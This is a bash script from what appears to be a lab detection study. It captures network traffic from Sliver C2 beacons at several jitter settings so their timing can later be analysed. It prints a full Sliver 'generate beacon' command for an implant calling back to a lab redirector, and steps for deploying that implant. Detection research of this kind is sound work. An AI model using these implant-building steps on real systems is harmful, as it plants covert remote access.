#!/bin/bash
#
# Operation GLASSHOUSE - Jitter Sensitivity Sweep
#
# Semi-automated helper for capturing one pcap per jitter configuration.
# The actual beacon generation still happens interactively in the Sliver
# console (there's no safe way to script that without the gRPC API), but
# this script handles everything else: prompting you for the right
# console command, waiting while you swap the binary and rebuild, timing
# the capture window, and naming the output files consistently so
# sweep_analysis.py can find them afterwards.
#
# Usage:
#   ./jitter_sweep.sh
#
# Edit the CONFIGS array below to add/remove jitter values to test.

set -e

PROJECT_ROOT="$HOME/operation-glasshouse"
CAPTURES_DIR="$PROJECT_ROOT/detection/captures/sweep"
BASE_SECONDS=45
CAPTURE_MINUTES=25

# Jitter values (seconds) to test against the fixed BASE_SECONDS interval.
CONFIGS=(0 10 20 30 40)

mkdir -p "$CAPTURES_DIR"

echo "=== Operation GLASSHOUSE - Jitter Sweep ==="
echo "Base interval: ${BASE_SECONDS}s | Capture window per config: ${CAPTURE_MINUTES}m"
echo "Configs to test: ${CONFIGS[*]}"
echo

for JITTER in "${CONFIGS[@]}"; do
  OUTFILE="jitter_$(printf '%02d' "$JITTER").pcap"
  echo "--------------------------------------------------------------"
  echo ">>> Config: jitter=${JITTER}s (base=${BASE_SECONDS}s)"
  echo
  echo "1. In the Sliver console (docker exec -it sliver-c2 sliver-server), run:"
  echo
  echo "   generate beacon --http redirector:8888 --os linux --arch arm64 \\"
  echo "     --skip-symbols --seconds ${BASE_SECONDS} --jitter ${JITTER} \\"
  echo "     --c2profile glasshouse --save /root/"
  echo
  echo "2. Copy the generated binary out of the container into ./target/beacon, e.g.:"
  echo "   docker cp sliver-c2:/root/<BINARY_NAME> ./target/beacon"
  echo
  echo "3. Rebuild and restart the target container:"
  echo "   docker compose up -d --build target"
  echo
  read -rp "Press ENTER once the new beacon is running and checking in... "

  echo
  echo ">>> Capturing for ${CAPTURE_MINUTES} minutes into ${OUTFILE} ..."
  docker exec redirector timeout "$((CAPTURE_MINUTES * 60))" \
    tcpdump -i eth0 -w "/captures/sweep/${OUTFILE}" port 8888 || true

  echo ">>> Capture complete: ${CAPTURES_DIR}/${OUTFILE}"
  echo

  read -rp "Stop the current beacon in the Sliver console (docker ps -a | grep target; docker stop target if needed), then press ENTER to continue to the next config... "
done

echo "=== Sweep complete. Run sweep_analysis.py next: ==="
echo "    cd $PROJECT_ROOT/detection"
echo "    source venv/bin/activate"
echo "    python3 sweep_analysis.py captures/sweep/"
